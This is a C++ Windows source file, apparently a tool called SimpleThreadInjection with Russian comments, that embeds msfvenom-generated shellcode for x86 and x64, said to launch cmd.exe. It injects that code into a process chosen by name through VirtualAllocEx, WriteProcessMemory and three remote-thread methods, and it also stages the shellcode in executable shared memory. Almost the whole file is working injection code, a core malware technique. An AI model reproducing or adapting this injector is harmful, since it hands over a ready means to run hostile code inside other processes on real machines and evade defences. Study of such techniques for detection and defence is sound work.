#include "stdafx.h"
#include "general.h"
#include <psapi.h>
#include <stdio.h>
#include <Windows.h>

#ifdef _X86_
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] = 
"\xeb\x27\x5b\x53\x5f\xb0\xf2\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xe8\xa0\x74\x07\x80\x3e\xf2\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x0f\xf2\xd6\xe4\x94\xd6\x7b\x2b\xfb\x3e"
"\xdd\xbd\x78\x3e\xc6\x6b\x84\x7e\x3f\x84\x79\x03\x84\x79"
"\x13\x84\x49\x07\x84\x71\x2f\x84\x39\x37\x40\x17\x7a\xfc"
"\x56\x0e\xde\xf0\xee\x6f\x84\x63\x2b\x2b\x84\x4a\x33\x84"
"\x5b\x27\x77\x0e\xe5\x84\x45\x17\x84\x55\x2f\x0e\xe4\xec"
"\x3b\x46\x84\x3b\x84\x0e\xe1\x3e\xf0\x3e\xcf\xf3\xa3\x8b"
"\xcf\x7b\x08\xce\xc0\x02\x0e\xc8\xe4\xfb\x34\x73\x2b\x27"
"\x7a\xee\x84\x55\x2b\x0e\xe4\x69\x84\x03\x44\x84\x55\x13"
"\x0e\xe4\x84\x0b\x84\x0e\xe7\x86\x4b\x2b\x13\x6e\xcc\xbd"
"\x07\x26\xdb\x86\xea\x86\xcd\x67\x81\x41\x01\xe3\x5d\xe7"
"\x90\xf0\xf0\xf0\x86\x4a\x0b\xb4\xe0\xc1\xef\x6f\x88\x13"
"\x2b\x5d\xe7\x81\xf0\xf0\xf0\x86\x4a\x07\x67\x63\x63\x2f"
"\x4e\x67\x3c\x3d\x21\x6b\x67\x7a\x7c\x6a\x7d\x3f\xd4\x87"
"\x53\x2b\x05\x86\xe9\x59\xf0\x5a\x0b\x86\xcd\x5f\xb4\xa7"
"\xad\x42\xb3\x88\x13\x2b\x5d\xe7\x50\xf0\xf0\xf0\x67\x6a"
"\x57\x2f\x2f\x67\x7c\x7c\x6e\x68\x67\x6a\x2f\x62\x6a\x67"
"\x63\x6c\x60\x6b\x67\x5c\x67\x6a\x63\x3e\xd4\x87\x53\x2b"
"\x1e\x86\xec\x67\x57\x2f\x2f\x2f\x67\x6c\x60\x6b\x6a\x67"
"\x67\x6a\x63\x63\x67\x60\x62\x2f\x7c\x67\x60\x2f\x69\x7d"
"\x67\x47\x6a\x63\x63\x3e\xc6\x87\x43\x2b\x1b\x86\xee\x3e"
"\xdd\x5d\x5c\x5e\x5d\xf0\xdf\x3e\xcf\x5f\xf0\x5a\x07\xe8"
"\xa0";

#endif

#ifdef _WIN64
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ LPVOID ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
	);

//msfvenom -a x64 --platform windows -p windows/x64/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] =
"\xeb\x27\x5b\x53\x5f\xb0\xa1\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\x66\x6b\x74\x07\x80\x3e\xa1\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\xaf\xa1\x44\x88\xf4\xfc\xf0\x1f\xb9\x53"
"\x01\xda\x52\xf8\xf6\xfc\xf1\x25\xa9\x9f\xa8\xe7\x50\x68"
"\xe7\x50\x69\xc9\x2e\x90\xf3\x3b\xdb\xa8\x2f\x91\xb9\xda"
"\x45\x44\x49\x50\x4e\x47\x7b\x50\x50\x50\xcf\xb9\x24\xe8"
"\x94\x9c\x90\x7f\x26\x33\x61\xba\x32\x98\x96\x9c\x91\x45"
"\xc9\xff\xc8\x87\x30\x08\x87\x30\x09\xa9\x4e\xf0\x39\x4d"
"\xbb\xc8\x4f\xf1\x26\xba\x25\x24\x29\x30\x2e\x27\x1b\x30"
"\x30\x30\xce\x26\x25\xe9\x95\x9d\x91\x7e\x19\x32\x60\xbb"
"\x33\x99\x97\x9d\x90\x44\xc8\xfe\xc9\x86\x31\x09\x86\x31"
"\x08\xa8\x4f\xf1\x89\x52\xba\xc9\x4e\xf0\x19\xbb\x24\x25"
"\x28\x31\x2f\x26\x1a\x31\x31\x31\xc0\x19\x2b\xe7\x9b\x93"
"\x9f\x70\x3d\x3c\x6e\xb5\x3d\x97\x99\x93\x9e\x4a\xc6\xf0"
"\xc7\x88\x3f\x07\x88\x3f\x06\xa6\x41\xff\x06\xf3\xb4\xc7"
"\x40\xfe\x3d\xb5\x2a\x2b\x26\x3f\x21\x28\x14\x3f\x3f\x3f"
"\xd4\x3d\x28\x9c\x55\x30\x24\x2b\x2b\x2b\x3c\x04\xd4\xd4"
"\xd4\x95\x85\x95\x84\x86\x85\x82\x9c\xe5\x06\xb1\x9c\x5f"
"\x86\xb4\xea\x9c\x5f\x86\xcc\xea\x9c\x5f\x86\xf4\xea\x9c"
"\x5f\xa6\x84\xea\x9c\xdb\x63\x9e\x9e\x99\xe5\x1d\x9c\xe5"
"\x14\x78\xe8\xb5\xa8\xd6\xf8\xf4\x95\x15\x1d\xd9\x95\xd5"
"\x15\x36\x39\x86\x95\x85\xea\x9c\x5f\x86\xf4\xea\x5f\x96"
"\xe8\x9c\xd5\x04\xea\x5f\x54\x5c\xd4\xd4\xd4\x9c\x51\x14"
"\xa0\xbb\x9c\xd5\x04\x84\xea\x5f\x9c\xcc\xea\x90\x5f\x94"
"\xf4\x9d\xd5\x04\x37\x88\x9c\x2b\x1d\xea\x95\x5f\xe0\x5c"
"\x9c\xd5\x02\x99\xe5\x1d\x9c\xe5\x14\x78\x95\x15\x1d\xd9"
"\x95\xd5\x15\xec\x34\xa1\x25\xea\x98\xd7\x98\xf0\xdc\x91"
"\xed\x05\xa1\x02\x8c\xea\x90\x5f\x94\xf0\x9d\xd5\x04\xb2"
"\xea\x95\x5f\xd8\x9c\xea\x90\x5f\x94\xc8\x9d\xd5\x04\xea"
"\x95\x5f\xd0\x5c\x9c\xd5\x04\x95\x8c\x95\x8c\x8a\x8d\x8e"
"\x95\x8c\x95\x8d\x95\x8e\x9c\x57\x38\xf4\x95\x86\x2b\x34"
"\x8c\x95\x8d\x8e\xea\x9c\x5f\xc6\x3d\x9d\x2b\x2b\x2b\x89"
"\xea\x9c\x59\x59\x9e\xd5\xd4\xd4\x95\x6e\x98\xa3\xf2\xd3"
"\x2b\x01\x9d\x13\x15\xe4\xd4\xd4\xd4\xea\x9c\x59\x41\xfe"
"\xd5\xd4\xd4\xea\x98\x59\x51\xeb\xd5\xd4\xd4\x9c\xe5\x1d"
"\x95\x6e\x91\x57\x82\xd3\x2b\x01\x6f\x34\xc9\xfe\xde\x95"
"\x6e\x72\x41\x69\x49\x2b\x01\x9c\x57\x10\xfc\xe8\xd2\xa8"
"\xde\x54\x2f\x34\xa1\xd1\x6f\x93\xc7\xa6\xbb\xbe\xd4\x8d"
"\x95\x5d\x0e\x2b\x01\x9c\xb1\xb8\xb8\xbb\xf4\xb2\xa6\xbb"
"\xb9\xf4\xa7\xbc\xb1\xb8\xb8\xb7\xbb\xb0\xb1\xd4\x99\xb1"
"\xa7\xa7\xb5\xb3\xb1\x96\xbb\xac\xd4\xa1\xa7\xb1\xa6\xe7"
"\xe6\xfa\xb0\xb8\xb8\xd4\x06\xf3\x89\x52\x39\x4d\xf3\x3b"
"\x66\x6b";
/*
"\x48\x31\xc9\x48\x81\xe9\xd3\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xf5\x73\x91\x4a\xb9\x4b\xd6\x95\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x09\x3b\x10"
"\xae\x49\xb4\x29\x6a\x1d\xa3\x91\x4a\xb9\x0a\x87\xd4\xa5"
"\x21\xc0\x1c\xf1\x7a\x04\xf0\xbd\xf8\xc3\x2a\x87\x03\x5d"
"\xc7\xed\x4d\xd9\xc1\xeb\x6b\xe8\xdd\x7e\x01\xc1\x74\xf1"
"\x44\x61\xdf\xbf\x3e\xa0\x83\xf1\x7a\x16\x39\xc9\x12\xed"
"\x48\x95\x6b\x97\x54\x3c\x7e\xd0\x4b\x78\xa9\x3b\xc7\xb4"
"\x22\xaf\x02\x32\x19\xf6\xab\x7e\x31\xad\x02\xb8\x9b\xe8"
"\x1e\x75\xfb\x91\x4a\xb9\x03\x53\x55\x81\x1c\xd9\x4b\x69"
"\x1b\xe8\x1e\xbd\x6b\xaf\x0e\x32\x0b\xf6\xdc\xf4\xa3\x72"
"\x16\xf1\xb4\x1f\xab\xb4\xf8\xa5\xc2\xf1\x4a\x00\xd8\xc4"
"\xba\xd9\x7b\x79\xe7\x97\x54\x3c\x7e\xd0\x4b\x78\x73\x36"
"\xe0\x04\x4d\xdd\x49\xf5\x6f\xde\xd0\xcc\xa2\xe4\x9c\xe1"
"\x75\x92\x1e\xb5\x57\xd8\x4b\x69\x2d\xe8\xd4\x7e\x7f\xd9"
"\x74\xfd\xc0\x96\x89\xbc\x72\x41\x74\xf8\xc0\xd2\x1d\xbd"
"\x72\x41\x0b\xe1\x0a\x8e\xcb\xac\x29\xd0\x12\xf8\x12\x97"
"\xcf\xbd\xf0\x7d\x6a\xf8\x19\x29\x75\xad\x32\xc8\x10\x87"
"\x03\x5d\x87\x1c\x3a\x6e\xb5\x46\x16\xe8\xdd\x78\xfe\xdb"
"\x4b\xb9\x4b\x97\x2f\xb9\x04\xb7\x4d\x46\x9e\x9f\x52\x34"
"\x43\x91\x4a\xb9\x75\x9e\x18\x60\x59\x90\x4a\xb9\x75\x9a"
"\x18\x70\x4c\x90\x4a\xb9\x03\xe7\x5c\xb4\xc9\xd4\xc9\xef"
"\x4c\x29\x40\x4e\x93\x8c\x60\xb3\x0a\x6c\x33\x60\xce\x0c"
"\xb5\x6c\x03\x55\x51\xdd\x4f\x97\x36\xb3\xcb\x2d\x75\x80"
"\x76\x2a\x0d\xaa\x39\xb9\xff\xf5\x2a\xd0\xc3\x63\xb4\x03"
"\xdd\x90\x1f\xfd\x25\x99\x2d\xa4\xfa\x98\x53\xe2\x22\xdc"
"\x27\xba\xf6\x9a\x17\xf4\x4a\xf4\x2e\xa5\xe6\x94\x14\xf4"
"\x08\xd6\x33\xd6\xe0\x86\x16\xe3\x79\x8b\x65\xb2\xf9\x99"
"\x73\x91\x4a\xb9\x4b\xd6\x95";
*/
#endif

typedef NTSTATUS(__stdcall* fnRtlIpv4StringToAddressA) (PCSTR S, BOOLEAN Strict, PCSTR* Terminator, in_addr* Addr);

typedef DWORD(WINAPI *prototype_RtlCreateUserThread)(
	HANDLE      ProcessHandle,
	PSECURITY_DESCRIPTOR  SecurityDescriptor,
	BOOL      CreateSuspended,
	ULONG     StackZeroBits,
	PULONG     StackReserved,
	PULONG     StackCommit,
	LPVOID     StartAddress,
	LPVOID     StartParameter,
	HANDLE      ThreadHandle,
	LPVOID     ClientID
	);

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 3)
	{
		HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE , 0, 1024, L"SharedMemory");
		if (hMapFile == NULL)
		{
			DWORD err = GetLastError();
			printf("Error code: %d\n", err);
			return 1;
		}
		printf("FileMapping created\n");


		// Проецирование разделяемой памяти в адресное пространство текущего процесса
		LPVOID pBuf = MapViewOfFile(hMapFile, /*FILE_MAP_ALL_ACCESS | */ FILE_MAP_EXECUTE | FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 1024);
		if (pBuf == NULL) {
			DWORD err = GetLastError();
			printf("Error code: %d\n", err);
			CloseHandle(hMapFile);
			return 1;
		}

		// Копирование шеллкода в разделяемую память
		// Здесь должен быть ваш шеллкод
		CopyMemory(pBuf, sc, sizeof(sc));

		/*
		DWORD processID = 32892;
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

		// Определение адреса функции и выделение памяти в целевом процессе
		// ...

		// Создание удалённого потока для вызова функции
		//LPVOID pRemoteThreadStart = /* адрес функции RtlIpv4StringToAddressA в целевом процессе */;
		//LPVOID pRemoteParams = /* адрес параметров в целевом процессе */;
		/*
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
			(LPTHREAD_START_ROUTINE)pRemoteThreadStart,
			pRemoteParams, 0, NULL);

		// Ожидание завершения потока и освобождение ресурсов
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		VirtualFreeEx(hProcess, pRemoteParams, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		*/

		// Ожидание, чтобы второй процесс мог выполнить шеллкод
		getchar();

		// Освобождение ресурсов
		UnmapViewOfFile(pBuf);
		CloseHandle(hMapFile);

		printf("Usage: SimpleThreadInjection.exe [process name] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\noption 3 - RtlCreateUserThread\n");
		return -1;
	}

	int option = _wtoi(argv[2]);
	if (option != 1 && option != 2 && option != 3)
	{
		printf("[-] Wrong option number\n");
		ExitProcess(-1);
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//printf("[-] Couldn't open process, exiting...\n");
		//return -1;
		ErrorExit(TEXT("OpenProcess"));
	}
	printf("[+] Process handle: 0x%x\n", (UINT)hProcess);

	//allocate memory in target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpBaseAddress);


	//write SC to target process
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc, sizeof(sc), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Shellcode is written to memory of target process\n");


	//start remote thread in target process
	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	switch (option)
	{
		//option 1: CreateRemoteThread
	case 1:
	{
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, (LPDWORD)(&ThreadId));
		if (hThread == NULL)
		{
			ErrorExit(TEXT("CreateRemoteThread"));
		}
		break;
	}
	//option 2: NtCreateThreadEx
	case 2:
	{
		prototype_NtCreateThreadEx pfnNtCreateThreadEx = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "NtCreateThreadEx", (PVOID *)&pfnNtCreateThreadEx);

		pfnNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, NULL, NULL, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("NtCreateThreadEx"));
		}
		break;
	}
	//option 3: RtlCreateUserThread
	case 3:
	{
		prototype_RtlCreateUserThread pfnRtlCreateUserThread = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "RtlCreateUserThread", (PVOID *)&pfnRtlCreateUserThread);

		pfnRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpBaseAddress, NULL, &hThread, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("RtlCreateUserThread"));
		}
		break;
	}
	}

	printf("[+] Successfully started SC in target process\n");

	return 0;
}

